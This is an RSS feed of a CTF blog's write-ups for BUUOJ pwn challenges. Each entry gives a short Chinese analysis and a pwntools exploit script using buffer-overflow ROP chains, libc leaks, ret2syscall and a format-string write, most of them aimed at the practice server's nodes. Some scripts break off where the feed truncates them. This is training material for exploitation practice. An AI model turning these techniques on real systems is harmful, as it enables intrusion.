<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Buuoj on</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/</link><description>Recent content in Buuoj on</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Wed, 29 Mar 2023 04:25:34 +0800</lastBuildDate><atom:link href="https://c3n1gbr0k3n.github.io/writeup/buuoj/index.xml" rel="self" type="application/rss+xml"/><item><title>Ciscn_2019_en_2</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_en_2/</link><pubDate>Fri, 07 Apr 2023 00:20:36 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_en_2/</guid><description>0x01 分析 # 和ciscn_2019_c_1差不多，就加密变了一点
0x02 Exploit # from pwn import* from LibcSearcher import* # context.log_level = 'debug' # o = process(&amp;quot;./pwn&amp;quot;) o = remote(&amp;quot;node4.buuoj.cn&amp;quot;, 25752) elf = ELF(&amp;quot;./pwn&amp;quot;) # libc = elf.libc puts_plt = elf.plt['puts'] gets_got = elf.got['gets'] encrypt = elf.sym['encrypt'] pop_rdi = 0x0000000000400c83 # leak libc payload = b'aaaaaaa\x00' + b'a'*80 payload += p64(pop_rdi) +p64(gets_got) + p64(puts_plt) + p64(encrypt) o.sendline(b'1') o.sendline(payload) o.recvuntil(&amp;quot;ooooooo\n&amp;quot;) # aaaaaaa加密后的结果 gets_addr = u64(o.recv(6) + b&amp;quot;\x00\x00&amp;quot;) libc = LibcSearcher(&amp;quot;gets&amp;quot;, gets_addr) libc_base = gets_addr - libc.</description></item><item><title>[HarekazeCTF2019]baby_rop</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/harekazectf2019_baby_rop/</link><pubDate>Fri, 07 Apr 2023 00:19:00 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/harekazectf2019_baby_rop/</guid><description>0x01 分析 # scanf类型溢出，有system函数
有 /bin/sh 字符串。很明显ret2libc
0x02 Exploit # from pwn import* # o = process(&amp;quot;./pwn&amp;quot;) o = remote(&amp;quot;node4.buuoj.cn&amp;quot;, 25854) pop_rdi = 0x0000000000400683 payload = b'a'*0x18 + p64(pop_rdi) + p64(0x601048) + p64(0x4005E3) o.sendline(payload) o.interactive() 自行调试</description></item><item><title>Jarvisoj_level2_x64</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/jarvisoj_level2_x64/</link><pubDate>Fri, 07 Apr 2023 00:17:54 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/jarvisoj_level2_x64/</guid><description>0x01 分析 # jarvisoj_level2的64位版本，有system和 /bin/sh 字符串，只是传参方式变了，还是ret2libc类型
0x02 Exploit # from pwn import* # o = process(&amp;quot;./pwn&amp;quot;) o = remote(&amp;quot;node4.buuoj.cn&amp;quot;, 27906) pop_rdi = 0x00000000004006b3 payload = b'a'*0x88 + p64(pop_rdi) + p64(0x600A90) + p64(0x400603) o.sendline(payload) o.interactive() 自行调试</description></item><item><title>[OGeek2019]babyrop</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/ogeek2019_babyrop/</link><pubDate>Fri, 07 Apr 2023 00:16:37 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/ogeek2019_babyrop/</guid><description>0x01 分析 # main函数主要就是读取一个随机数
然后让我们输入和给定的随机数进行比较
我们可以直接在开头输入 \x00 进行截断，绕过比较，然后返回的buf[7]的值会作为下一个函数的参数
只要buf[7]的值够的就可以造成溢出，然后就是正常的ret2libc了
0x02 Exploit # from pwn import* context.log_level = 'debug' # o = process(&amp;quot;./pwn&amp;quot;) o = remote(&amp;quot;node4.buuoj.cn&amp;quot;, 29781) elf = ELF(&amp;quot;./pwn&amp;quot;) libc = ELF(&amp;quot;./libc-2.23.so&amp;quot;) puts_plt = elf.plt['puts'] read_got = elf.got['read'] main = 0x8048825 # leak libc key = b&amp;quot;\x00&amp;quot; + b&amp;quot;\xff&amp;quot;*7 o.sendline(key) o.recv() payload = b'a'*(0xe7+4) + p32(puts_plt) + p32(main) + p32(read_got) o.sendline(payload) read_addr = u32(o.recv(4)) libc_base = read_addr - libc.sym[&amp;quot;read&amp;quot;] log.info(hex(libc_base)) sys_addr = libc_base + libc.</description></item><item><title>get_started_3dsctf_2016</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/get_started_3dsctf_2016/</link><pubDate>Fri, 07 Apr 2023 00:15:13 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/get_started_3dsctf_2016/</guid><description>0x01 分析 # 简单的溢出，但是这是一个静态链接，程序里没有system函数和 /bin/sh 字符串，但是存在内陷指令，也存在mprotect函数。所以这里可以用ret2syscall来做，或者用mprotect修改bss段权限注入shellcode，或者rop-chain来做
0x02 Exploit # from pwn import* o = process(&amp;quot;./pwn&amp;quot;) elf = ELF(&amp;quot;./pwn&amp;quot;) gets_addr = elf.sym['gets'] main = elf.sym['main'] bss_addr = 0x80EBF80 int_80 = 0x0806d7e5 pop_eax = 0x080b91e6 pop3 = 0x0806fc30 payload = b'a'*(4*14) + p32(gets_addr) + p32(main) + p32(bss_addr) o.sendline(payload) o.sendline(&amp;quot;/bin/sh&amp;quot;) payload = b'a'*(4*14) + p32(pop3) + p32(0) + p32(0) + p32(bss_addr) + p32(pop_eax) + p32(11) + p32(int_80) o.sendline(payload) o.interactive() 自行尝试其他方法</description></item><item><title>bjdctf_2020_babystack</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/bjdctf_2020_babystack/</link><pubDate>Thu, 06 Apr 2023 21:03:41 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/bjdctf_2020_babystack/</guid><description>0x01 分析 # 有溢出
还有直接getshell的函数，所以直接ret2text
0x02 Exploit # from pwn import* # o = process(&amp;quot;./pwn&amp;quot;) o = remote(&amp;quot;node4.buuoj.cn&amp;quot;, 26893) payload = b'a'*0x18 + p64(0x4007CB) + p64(0x4006E6) o.sendlineafter(b&amp;quot;length of your name:&amp;quot;, str(len(payload)+1).encode()) o.sendline(payload) o.interactive() 自行调试</description></item><item><title>jarvisoj_level2</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/jarvisoj_level2/</link><pubDate>Thu, 06 Apr 2023 21:02:34 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/jarvisoj_level2/</guid><description>0x01 分析 # 有system函数
也有 /bin/sh 字符串
所以就是ret2libc
0x02 Exploit # from pwn import* # o = process(&amp;quot;./pwn&amp;quot;) o = remote(&amp;quot;node4.buuoj.cn&amp;quot;, 29126) call_system = 0x804845C bin_sh = 0x804A024 payload = b'a'*140 + p32(call_system) + p32(bin_sh) o.sendline(payload) o.interactive() 自行调试</description></item><item><title>ciscn_2019_n_8</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_n_8/</link><pubDate>Thu, 06 Apr 2023 21:00:22 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_n_8/</guid><description>0x01 分析 # got表可写
所以只要覆盖var[13]的第一个字节为17就行
0x02 Exploit # from pwn import* # o = process(&amp;quot;./pwn&amp;quot;) o = remote(&amp;quot;node4.buuoj.cn&amp;quot;, 29076) payload = b'a'*(4*13) + p32(17) + p32(0) o.sendline(payload) o.interactive() 自行调试</description></item><item><title>ciscn_2019_c_1</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_c_1/</link><pubDate>Thu, 06 Apr 2023 20:58:25 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/ciscn_2019_c_1/</guid><description>0x01 分析 # 没有canary保护，got表也可写
encrypt存在一个溢出点
结尾处也有一个可以泄露栈的地方，但是泄露的东西都是经过加密的，加密方法也不难，但可以直接调用puts@plt泄露比较方便，然后就是常规的ret2libc
0x02 Exploit # from pwn import* from LibcSearcher import* # context.log_level = 'debug' # o = process(&amp;quot;./pwn&amp;quot;) o = remote(&amp;quot;node4.buuoj.cn&amp;quot;, 27675) elf = ELF(&amp;quot;./pwn&amp;quot;) # libc = elf.libc puts_plt = elf.plt['puts'] gets_got = elf.got['gets'] encrypt = elf.sym['encrypt'] pop_rdi = 0x0000000000400c83 # leak libc payload = b'aaaaaaa\x00' + b'a'*80 payload += p64(pop_rdi) +p64(gets_got) + p64(puts_plt) + p64(encrypt) o.sendline(b'1') o.sendline(payload) o.recvuntil(&amp;quot;lllllll\n&amp;quot;) # aaaaaaa加密后的结果 gets_addr = u64(o.recv(6) + b&amp;quot;\x00\x00&amp;quot;) libc = LibcSearcher(&amp;quot;gets&amp;quot;, gets_addr) libc_base = gets_addr - libc.</description></item><item><title>[第五空间 2019 决赛] PWN5</title><link>https://c3n1gbr0k3n.github.io/writeup/buuoj/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4_2019_%E5%86%B3%E8%B5%9B_pwn5/</link><pubDate>Thu, 06 Apr 2023 19:15:01 +0800</pubDate><guid>https://c3n1gbr0k3n.github.io/writeup/buuoj/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4_2019_%E5%86%B3%E8%B5%9B_pwn5/</guid><description>0x01 分析 # 思路很清晰，利用格式化任意写可以覆盖随机值为指定值，然后就可以输入指定值了
或者也可以读取这个随机值（通过%s读取，只要里面没有 \x00 即可）
跟在随机值存储位置后面的就是随机值
0x02 Exploit # from pwn import* context.log_level = 'debug' o = process(&amp;quot;./pwn5&amp;quot;) payload = p32(0x804C044) + &amp;quot;%10$s&amp;quot; o.sendline(payload) o.recvuntil(p32(0x804C044)) res = u32(o.recv(4)) log.info(hex(res)) o.sendline(str(res).encode()) o.interactive() 覆盖的脚本为
from pwn import* o = process(&amp;quot;./pwn5&amp;quot;) payload = p32(0x804C044) + &amp;quot;%10$n&amp;quot; o.sendline(payload) o.sendline(b'4') o.interactive()</description></item></channel></rss>